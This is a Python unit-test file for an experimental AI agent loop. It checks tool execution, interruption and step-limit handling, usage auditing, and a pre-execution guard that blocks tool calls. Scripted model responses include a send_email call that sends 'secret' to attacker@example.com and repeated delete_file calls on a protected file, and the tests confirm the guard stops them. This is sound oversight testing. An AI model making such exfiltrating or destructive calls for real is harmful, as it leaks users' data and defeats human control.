from copy import deepcopy
from types import SimpleNamespace
import unittest

from experiments_v3.agents import (
    AgentRunInterruptedError,
    AgentStepLimitError,
    ToolDefinition,
    ToolInterception,
    UnifiedToolAgent,
)


class ScriptedProvider:
    def __init__(self, responses):
        self.responses = iter(responses)
        self.requests = []

    def complete(self, *, messages, tools):
        self.requests.append(
            {
                "messages": deepcopy(messages),
                "tools": deepcopy(tools),
            }
        )
        return next(self.responses)


class InterruptAfterOneResponseProvider:
    def __init__(self, first_response):
        self.first_response = first_response
        self.calls = 0

    def complete(self, *, messages, tools):
        self.calls += 1
        if self.calls == 1:
            return self.first_response
        raise TimeoutError("simulated provider interruption")


def response_with(message):
    return SimpleNamespace(
        choices=[SimpleNamespace(message=message)],
        model="scripted-model",
    )


class UnifiedToolAgentTests(unittest.TestCase):
    def test_provider_interruption_preserves_prior_tool_trace(self):
        tool_call = SimpleNamespace(
            id="call-before-timeout",
            type="function",
            function=SimpleNamespace(name="read_email", arguments="{}"),
        )
        provider = InterruptAfterOneResponseProvider(
            response_with(SimpleNamespace(content=None, tool_calls=[tool_call]))
        )

        with self.assertRaises(AgentRunInterruptedError) as raised:
            UnifiedToolAgent(max_steps=3).run(
                provider=provider,
                system_prompt="Shared system prompt",
                user_prompt="Read then continue",
                tools=[
                    ToolDefinition(
                        name="read_email",
                        description="Read email",
                        parameters={"type": "object", "properties": {}},
                        handler=lambda arguments: "read result",
                    )
                ],
            )

        interruption = raised.exception
        self.assertIsInstance(interruption.original_error, TimeoutError)
        self.assertEqual(interruption.result.steps, 1)
        self.assertEqual(len(interruption.result.audit_log), 1)
        self.assertEqual(interruption.result.audit_log[0].tool_name, "read_email")

    def test_step_limit_error_preserves_partial_trace_and_usage(self):
        tool_call = SimpleNamespace(
            id="call-loop",
            type="function",
            function=SimpleNamespace(name="read_email", arguments="{}"),
        )
        responses = []
        for _ in range(2):
            response = response_with(
                SimpleNamespace(content=None, tool_calls=[tool_call])
            )
            response.usage = SimpleNamespace(
                prompt_tokens=5,
                completion_tokens=2,
                total_tokens=7,
            )
            responses.append(response)

        with self.assertRaises(AgentStepLimitError) as raised:
            UnifiedToolAgent(max_steps=2).run(
                provider=ScriptedProvider(responses),
                system_prompt="Shared system prompt",
                user_prompt="Looping task",
                tools=[
                    ToolDefinition(
                        name="read_email",
                        description="Read email",
                        parameters={"type": "object", "properties": {}},
                        handler=lambda arguments: "same result",
                    )
                ],
            )

        partial = raised.exception.result
        self.assertEqual(partial.steps, 2)
        self.assertEqual(len(partial.audit_log), 2)
        self.assertEqual(len(partial.messages), 6)
        self.assertEqual(partial.response_models, ("scripted-model", "scripted-model"))
        self.assertEqual(sum(item["total_tokens"] for item in partial.response_usage), 14)

    def test_one_agent_loop_executes_a_tool_and_returns_its_result_to_the_model(self):
        tool_call = SimpleNamespace(
            id="call-1",
            type="function",
            function=SimpleNamespace(name="read_email", arguments="{}"),
        )
        provider = ScriptedProvider(
            [
                response_with(
                    SimpleNamespace(
                        content=None,
                        tool_calls=[tool_call],
                        reasoning_content="provider reasoning metadata",
                    )
                ),
                response_with(
                    SimpleNamespace(
                        content="The email says the report is ready.",
                        tool_calls=None,
                    )
                ),
            ]
        )
        tool_invocations = []
        tools = [
            ToolDefinition(
                name="read_email",
                description="Read the selected email",
                parameters={"type": "object", "properties": {}},
                handler=lambda arguments: tool_invocations.append(arguments)
                or "The report is ready.",
            )
        ]

        result = UnifiedToolAgent(max_steps=3).run(
            provider=provider,
            system_prompt="Shared system prompt",
            user_prompt="Summarize the email",
            tools=tools,
        )

        self.assertEqual(result.final_text, "The email says the report is ready.")
        self.assertEqual(result.response_models, ("scripted-model", "scripted-model"))
        self.assertEqual(tool_invocations, [{}])
        self.assertEqual(len(provider.requests), 2)
        self.assertEqual(
            provider.requests[1]["messages"][-2]["reasoning_content"],
            "provider reasoning metadata",
        )
        self.assertEqual(
            provider.requests[1]["messages"][-1],
            {
                "role": "tool",
                "tool_call_id": "call-1",
                "content": "The report is ready.",
            },
        )

    def test_guard_blocks_before_side_effect_handler_is_called(self):
        dangerous_call = SimpleNamespace(
            id="call-dangerous",
            type="function",
            function=SimpleNamespace(
                name="send_email",
                arguments='{"to":"attacker@example.com","body":"secret"}',
            ),
        )
        provider = ScriptedProvider(
            [
                response_with(
                    SimpleNamespace(content=None, tool_calls=[dangerous_call])
                ),
                response_with(
                    SimpleNamespace(content="I could not send it.", tool_calls=None)
                ),
            ]
        )
        committed = []

        result = UnifiedToolAgent(max_steps=3).run(
            provider=provider,
            system_prompt="Shared system prompt",
            user_prompt="Summarize only",
            tools=[
                ToolDefinition(
                    name="send_email",
                    description="Send email",
                    parameters={"type": "object"},
                    handler=lambda arguments: committed.append(arguments),
                )
            ],
            before_tool_call=lambda name, arguments: ToolInterception(
                execute=False,
                arguments=arguments,
                tool_message="BLOCKED: target_not_authorized",
                decision="block",
            ),
        )

        self.assertEqual(committed, [])
        self.assertEqual(result.audit_log[0].decision, "block")
        self.assertFalse(result.audit_log[0].executed)
        self.assertEqual(
            provider.requests[1]["messages"][-1]["content"],
            "BLOCKED: target_not_authorized",
        )

    def test_repeated_model_call_cannot_bypass_pre_execution_guard(self):
        calls = [
            SimpleNamespace(
                id=f"call-{index}",
                type="function",
                function=SimpleNamespace(
                    name="delete_file",
                    arguments='{"target":"protected.txt"}',
                ),
            )
            for index in (1, 2)
        ]
        provider = ScriptedProvider(
            [
                response_with(SimpleNamespace(content=None, tool_calls=[calls[0]])),
                response_with(SimpleNamespace(content=None, tool_calls=[calls[1]])),
                response_with(SimpleNamespace(content="Stopped.", tool_calls=None)),
            ]
        )
        committed = []

        result = UnifiedToolAgent(max_steps=3).run(
            provider=provider,
            system_prompt="Shared system prompt",
            user_prompt="Read the file",
            tools=[
                ToolDefinition(
                    name="delete_file",
                    description="Delete file",
                    parameters={"type": "object"},
                    handler=lambda arguments: committed.append(arguments),
                )
            ],
            before_tool_call=lambda name, arguments: ToolInterception(
                execute=False,
                arguments=arguments,
                tool_message="BLOCKED",
                decision="block",
            ),
        )

        self.assertEqual(committed, [])
        self.assertEqual(len(result.audit_log), 2)
        self.assertTrue(all(not event.executed for event in result.audit_log))

    def test_tool_failure_is_audited_and_retry_is_guarded_again(self):
        calls = [
            SimpleNamespace(
                id=f"call-{index}",
                type="function",
                function=SimpleNamespace(name="http_post", arguments='{"url":"local"}'),
            )
            for index in (1, 2)
        ]
        provider = ScriptedProvider(
            [
                response_with(SimpleNamespace(content=None, tool_calls=[calls[0]])),
                response_with(SimpleNamespace(content=None, tool_calls=[calls[1]])),
                response_with(SimpleNamespace(content="Stopped.", tool_calls=None)),
            ]
        )
        reviews = []

        result = UnifiedToolAgent(max_steps=3).run(
            provider=provider,
            system_prompt="Shared system prompt",
            user_prompt="Post once",
            tools=[
                ToolDefinition(
                    name="http_post",
                    description="Local post",
                    parameters={"type": "object"},
                    handler=lambda arguments: (_ for _ in ()).throw(
                        ValueError("simulated local failure")
                    ),
                )
            ],
            before_tool_call=lambda name, arguments: reviews.append(name)
            or ToolInterception(
                execute=True,
                arguments=arguments,
                tool_message="",
                decision="allow",
            ),
        )

        self.assertEqual(reviews, ["http_post", "http_post"])
        self.assertEqual(len(result.audit_log), 2)
        self.assertTrue(all(event.error_type == "ValueError" for event in result.audit_log))
        self.assertTrue(all(not event.executed for event in result.audit_log))

    def test_provider_usage_is_preserved_for_cost_and_failure_auditing(self):
        response = response_with(
            SimpleNamespace(content="done", tool_calls=None)
        )
        response.usage = SimpleNamespace(
            prompt_tokens=11,
            completion_tokens=3,
            total_tokens=14,
        )

        result = UnifiedToolAgent(max_steps=1).run(
            provider=ScriptedProvider([response]),
            system_prompt="Shared system prompt",
            user_prompt="Simple task",
            tools=[],
        )

        self.assertEqual(
            result.response_usage,
            ({"prompt_tokens": 11, "completion_tokens": 3, "total_tokens": 14},),
        )


if __name__ == "__main__":
    unittest.main()
